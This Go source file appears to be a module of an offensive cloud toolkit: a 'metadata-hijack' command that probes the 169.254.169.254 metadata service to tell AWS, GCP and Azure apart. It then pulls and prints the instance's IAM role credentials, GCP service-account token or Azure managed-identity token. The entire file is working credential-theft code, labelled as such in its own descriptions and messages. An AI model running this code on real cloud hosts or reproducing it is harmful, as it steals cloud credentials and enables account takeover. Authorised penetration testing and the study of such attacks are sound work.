package multi_cloud

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

// MetadataHijackCmd represents the metadata hijack command
var MetadataHijackCmd = &cobra.Command{
	Use:   "metadata-hijack",
	Short: "Attempt to hijack cloud metadata service credentials",
	Long:  `Attempts to exfiltrate credentials from cloud metadata services (AWS, GCP, Azure)`,
	Run: func(cmd *cobra.Command, args []string) {
		Run()
	},
}

// Metadata endpoints for AWS, GCP, Azure
const (
	awsMetadataURL   = "http://169.254.169.254/latest/meta-data/"
	gcpMetadataURL   = "http://169.254.169.254/computeMetadata/v1/"
	azureMetadataURL = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
)

// Run executes the metadata hijack attack
func Run() {
	fmt.Println("[*] Running metadataHijack module...")

	switch detectCloudProvider() {
	case "AWS":
		hijackAWS()
	case "GCP":
		hijackGCP()
	case "AZURE":
		hijackAzure()
	default:
		fmt.Println("[!] Unable to detect cloud provider or access metadata service.")
	}
}

// detectCloudProvider probes cloud metadata endpoints to identify the cloud provider
func detectCloudProvider() string {
	client := http.Client{Timeout: 2 * time.Second}

	// AWS detection
	resp, err := client.Get(awsMetadataURL)
	if err == nil {
		if cerr := resp.Body.Close(); cerr == nil && resp.StatusCode == 200 {
			return "AWS"
		}
	}

	// GCP detection
	req, err := http.NewRequest("GET", gcpMetadataURL, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err = client.Do(req)
	if err == nil {
		if cerr := resp.Body.Close(); cerr == nil && resp.StatusCode == 200 {
			return "GCP"
		}
	}

	// Azure detection
	req, err = http.NewRequest("GET", azureMetadataURL, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("Metadata", "true")
	resp, err = client.Do(req)
	if err == nil {
		if cerr := resp.Body.Close(); cerr == nil && resp.StatusCode == 200 {
			return "AZURE"
		}
	}

	return ""
}

func hijackAWS() {
	fmt.Println("[+] Cloud: AWS - Attempting credential exfiltration...")

	// IAM Role name
	roleNameURL := awsMetadataURL + "iam/security-credentials/"
	roleResp, err := http.Get(roleNameURL)
	if err != nil {
		fmt.Println("[-] Failed to retrieve IAM role name:", err)
		return
	}
	defer func() {
		if cerr := roleResp.Body.Close(); cerr != nil {
			fmt.Printf("[-] Failed to close response body: %v\n", cerr)
		}
	}()

	roleNameRaw, err := io.ReadAll(roleResp.Body)
	if err != nil {
		fmt.Println("[-] Failed to read role name:", err)
		return
	}
	roleName := strings.TrimSpace(string(roleNameRaw))

	// Get credentials
	credURL := awsMetadataURL + "iam/security-credentials/" + roleName
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	credResp, err := client.Get(credURL)
	if err != nil {
		fmt.Println("[-] Failed to retrieve credentials:", err)
		return
	}
	defer func() {
		if cerr := credResp.Body.Close(); cerr != nil {
			fmt.Printf("[-] Failed to close response body: %v\n", cerr)
		}
	}()

	creds, err := io.ReadAll(credResp.Body)
	if err != nil {
		fmt.Println("[-] Failed to read credentials:", err)
		return
	}

	fmt.Println("[+] IAM Role:", roleName)
	fmt.Println("[+] Credentials:\n", string(creds))
}

func hijackGCP() {
	fmt.Println("[+] Cloud: GCP - Attempting token exfiltration...")

	req, err := http.NewRequest("GET", gcpMetadataURL+"instance/service-accounts/default/token", nil)
	if err != nil {
		fmt.Println("[-] Failed to create request:", err)
		return
	}
	req.Header.Set("Metadata-Flavor", "Google")

	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Failed to retrieve GCP token:", err)
		return
	}
	defer func() {
		if cerr := resp.Body.Close(); cerr != nil {
			fmt.Printf("[-] Failed to close response body: %v\n", cerr)
		}
	}()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("[-] Failed to retrieve GCP token, status: %d\n", resp.StatusCode)
		return
	}

	token, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("[-] Failed to read token:", err)
		return
	}

	fmt.Println("[+] OAuth Token:\n", string(token))
}

func hijackAzure() {
	fmt.Println("[+] Cloud: Azure - Attempting token exfiltration...")

	req, err := http.NewRequest("GET", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", nil)
	if err != nil {
		fmt.Println("[-] Failed to create request:", err)
		return
	}
	req.Header.Set("Metadata", "true")

	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Failed to retrieve Azure MSI token:", err)
		return
	}
	defer func() {
		if cerr := resp.Body.Close(); cerr != nil {
			fmt.Printf("[-] Failed to close response body: %v\n", cerr)
		}
	}()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("[-] Failed to retrieve Azure MSI token, status: %d\n", resp.StatusCode)
		return
	}

	token, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("[-] Failed to read token:", err)
		return
	}

	fmt.Println("[+] MSI Token:\n", string(token))
}
